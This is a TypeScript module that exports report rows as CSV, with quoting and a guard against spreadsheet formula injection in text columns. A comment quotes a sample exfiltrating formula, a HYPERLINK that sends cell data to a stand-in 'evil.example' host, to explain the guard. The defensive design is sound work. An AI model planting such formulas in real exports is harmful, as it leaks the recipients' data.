/**
 * CSV serialisation for report exports.
 *
 * Pure, so it is unit-testable without a database or a request. The two things
 * it has to get right are quoting and formula injection, and only one of them
 * is obvious.
 */

export type ColumnKind = 'text' | 'number' | 'date'

export interface Column<Row> {
  key: keyof Row & string
  header: string
  kind: ColumnKind
}

/**
 * Neutralises a spreadsheet formula.
 *
 * ┌───────────────────────────────────────────────────────────────────────────┐
 * │ A CSV EXPORT IS A FILE SOMEBODY OPENS IN EXCEL.                           │
 * │                                                                           │
 * │ Excel, LibreOffice and Sheets all treat a cell beginning `=`, `+`, `-`,   │
 * │ `@`, tab or carriage return as a formula and evaluate it on open. Every   │
 * │ text column here is authored by a user — a question stem, a person's      │
 * │ name — so a stem written as                                               │
 * │                                                                           │
 * │     =HYPERLINK("http://evil.example/"&A1,"Click")                         │
 * │                                                                           │
 * │ becomes a live link in the chef's spreadsheet, carrying a cell of data    │
 * │ with it. Prefixing with an apostrophe makes the cell literal text; the    │
 * │ apostrophe is a display convention and is not part of the value.          │
 * │                                                                           │
 * │ APPLIED TO TEXT COLUMNS ONLY. The usual advice is to guard anything       │
 * │ starting with `-`, which would rewrite the score -1 as '-1 and break      │
 * │ every numeric column in the file. Columns declare their kind so the guard │
 * │ lands where the risk actually is.                                         │
 * └───────────────────────────────────────────────────────────────────────────┘
 */
function neutralise(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
}

/** RFC 4180: quote when the value contains a delimiter, quote or newline. */
function quote(value: string): string {
  if (/[",\r\n]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`
  }
  return value
}

function render(value: unknown, kind: ColumnKind): string {
  if (value === null || value === undefined) return ''

  if (kind === 'number') {
    // Left as-is. An empty cell means "no data" and must not become 0 — the
    // same distinction the reports themselves are careful about.
    return typeof value === 'number' ? String(value) : String(value)
  }

  if (kind === 'date') {
    const d = value instanceof Date ? value : new Date(String(value))
    return Number.isNaN(d.getTime()) ? '' : d.toISOString()
  }

  return neutralise(String(value))
}

/** Serialises rows to RFC 4180 CSV with a header line. */
export function toCsv<Row extends object>(rows: Row[], columns: Column<Row>[]): string {
  const lines: string[] = [columns.map((c) => quote(c.header)).join(',')]

  for (const row of rows) {
    lines.push(
      columns.map((c) => quote(render((row as Record<string, unknown>)[c.key], c.kind))).join(','),
    )
  }

  // CRLF per RFC 4180, and a trailing newline so the file ends cleanly.
  return lines.join('\r\n') + '\r\n'
}

/** `bookends-team-2026-07-28.csv` */
export function exportFilename(dataset: string, now: Date): string {
  const date = now.toISOString().slice(0, 10)
  return `bookends-${dataset}-${date}.csv`
}
